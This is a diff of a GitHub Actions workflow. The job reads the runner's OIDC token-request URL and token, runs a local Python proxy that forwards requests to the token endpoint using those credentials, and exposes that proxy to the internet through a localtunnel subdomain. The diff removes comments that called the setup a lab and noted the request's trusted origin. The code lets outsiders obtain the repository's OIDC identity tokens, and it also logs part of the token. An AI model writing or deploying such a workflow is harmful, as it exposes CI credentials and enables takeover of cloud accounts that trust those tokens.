@@ -10,17 +10,23 @@ jobs:
       image: node:18-bullseye
       options: --privileged --init
 
-    env:
-      # These are automatically injected by GitHub Actions
-      ID_TOKEN_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
-      ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
-
     steps:
       - name: Initialize Proxy Environment
+        # The env context is NOT used here. Instead, we rely on the 
+        # ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN 
+        # being automatically injected into the step's environment by 
+        # the GitHub Actions runner when OIDC is enabled.
+        
         run: |
+          # Verify the variables are present in the environment
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ] || [ -z "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
+            echo "ERROR: OIDC environment variables are not set. Ensure the workflow is running on a GitHub-hosted runner and the repository has OIDC configured (or is using the default)."
+            exit 1
+          fi
+
           echo "=== OIDC Proxy Environment Initialized ==="
-          echo "Runner URL: $ID_TOKEN_URL"
-          echo "Token: ${ID_TOKEN_REQUEST_TOKEN:0:20}..."
+          echo "Runner URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "Token: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:20}..."
 
           # 1. Install necessary tools
           apt-get update && apt-get install -y curl jq
@@ -36,6 +42,7 @@ jobs:
           import sys
 
           PORT = 8080
+          # These will be read from the environment when the script starts
           REQUEST_URL = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
           REQUEST_TOKEN = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
 
@@ -56,7 +63,6 @@ jobs:
                   self.log_message(f"Proxying request to: {final_url}")
 
                   # Execute the token request using the runner's internal credentials
-                  # This request originates from the trusted GitHub environment
                   cmd = [
                       'curl', '-s', '-X', 'GET',
                       final_url,
@@ -77,7 +83,6 @@ jobs:
                       self.wfile.write(json.dumps({"error": e.stderr, "cmd": " ".join(cmd)}).encode())
 
               def log_message(self, format, *args):
-                  # Override to print to stdout for GitHub Actions logs
                   print(f"[PROXY] {format % args}", file=sys.stderr, flush=True)
 
           if __name__ == "__main__":
@@ -90,19 +95,14 @@ jobs:
           python3 /tmp/oidc_proxy.py &
 
           # 4. Start a local tunnel to expose the proxy
-          # We use 'localtunnel' because it requires no API key or account
           npm install -g localtunnel
           
           # Start the tunnel in the background
           lt --port 8080 --subdomain=github-oidc-proxy &
 
-          # 5. Wait for the tunnel to be ready and print the URL
+          # 5. Wait for the tunnel to be ready
           echo "Waiting for tunnel to establish..."
           sleep 15
-          
-          # Attempt to find the public URL (localtunnel prints it to stderr)
-          # In a real lab, you'd watch the GitHub Actions logs for the URL.
-          # For this lab, we assume you know the subdomain or we can parse it.
           
           # Keep the job alive
           echo "Proxy is live. Monitor GitHub Actions logs for the public URL."
